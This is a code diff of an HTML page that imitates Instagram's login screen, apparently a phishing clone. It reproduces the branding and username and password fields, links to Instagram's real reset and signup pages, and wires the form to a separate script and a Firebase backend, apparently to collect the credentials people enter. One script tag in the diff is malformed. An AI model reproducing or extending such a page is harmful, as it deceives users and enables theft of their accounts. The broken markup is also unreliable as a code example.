@@ -3,7 +3,6 @@
 <head>
 	<meta charset="UTF-8">
     <title>Login • Instagram</title>
-    <script src="img.js"></script>
     <link rel="stylesheet" href="styles.css">
 	<link rel="shortcut icon" type="image/png" href="https://instagram-brand.com/wp-content/uploads/2016/11/Instagram_AppIcon_Aug2017.png?w=300">
 
@@ -58,20 +57,20 @@
         <div class="wrapper" id="he">
           <div class="header">
 				<div class="content">
-					<form id="add-user-form" #userForm="ngForm" (ngSubmit)="submit(userForm)">
-						<input required type="text" name="username" placeholder="Phone number, username, or email" class="input">
+					<form id="add-user-form">
+						<input type="text" name="username" id="user_input" placeholder="Phone number, username, or email" class="input">
 						<br class="br2">
-            <input required type="password" name="password" placeholder="Password" class="input">
+            <input type="password" name="password" id="pass_input" placeholder="Password" class="input">
             <div class="forgot" style="text-align: center;">
             <a style="color: #0095f6;" href="https://www.instagram.com/accounts/password/reset/">Forgot password?</a>
                       </div>
-						<button class="login" type="submit" [disabled]="userForm.invalid">Log In</button>
+						<button class="login" type="submit" id="registera" value="Register" disabled="disabled">Log In</button>
 				</form>
 				<ul id="user-list"></ul>
         </div>
         <div>
 
-
+          <script src="script.js"></script>
 
           <p class="account">Don't have an account? <a id="sign" href="https://www.instagram.com/accounts/signup/phone">Sign up</a></p>
         </div>
@@ -113,7 +112,7 @@
         
 <!-- TODO: Add SDKs for Firebase products that you want to use 
      https://firebase.google.com/docs/web/setup#available-libraries -->
-	 <script src="https://www.gstatic.com/firebasejs/7.15.1/firebase-analytics.js"></script>
+	 <script.js.............................. src="https://www.gstatic.com/firebasejs/7.15.1/firebase-analytics.js"></script.js...............................>
 
 	 <script>
 	   // Your web app's Firebase configuration
